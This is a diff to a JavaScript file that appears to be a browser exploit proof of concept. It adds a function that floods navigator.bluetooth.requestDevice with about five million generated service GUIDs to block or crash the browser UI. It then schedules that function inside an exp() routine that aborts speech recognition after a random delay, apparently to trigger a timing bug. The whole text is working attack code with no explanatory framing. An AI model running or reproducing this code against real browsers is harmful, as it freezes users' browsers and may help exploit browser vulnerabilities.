@@ -33,6 +33,39 @@ function getRndInteger(min, max) {
     return Math.floor(Math.random() * (max - min + 1) ) + min;
 }
 
+function blockuiwithb()
+{
+  
+  function guid() {
+  function s4() {
+    return Math.floor((1 + Math.random()) * 0x10000)
+      .toString(16)
+      .substring(1);
+  }
+  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
+    s4() + '-' + s4() + s4() + s4();
+}
+
+gs=[];
+for(i=0;i<5*1024*1024;i++) {gs.push(guid())}
+
+options = {
+  filters: [
+    {services: ['heart_rate']},
+    {services: [6146, 0x1803]},
+    {services: gs},
+    {name: 'ExampleName'},
+    {namePrefix: 'Prefix'}
+  ],
+  optionalServices: ['battery_service']
+}
+navigator.bluetooth.requestDevice(options).then(function(device) {
+  console.log('Name: ' + device.name);
+  // Do something with the device.
+}) 
+  
+}
+
 function exp() {
   
   //for (var i =0; i<0x90000000;i++)
@@ -45,7 +78,7 @@ function exp() {
   var inn = getRndInteger(5446,5600)
   timer = setTimeout('try{recognition.abort();}catch(e){}', inn);
   console.log("dick " + inn);
-  for(i=0; i <100000000000000000; i++){}
+  setTimeout('blockuiwithb()',3000);
 
 }
 //window.setInterval(exp, 15000);
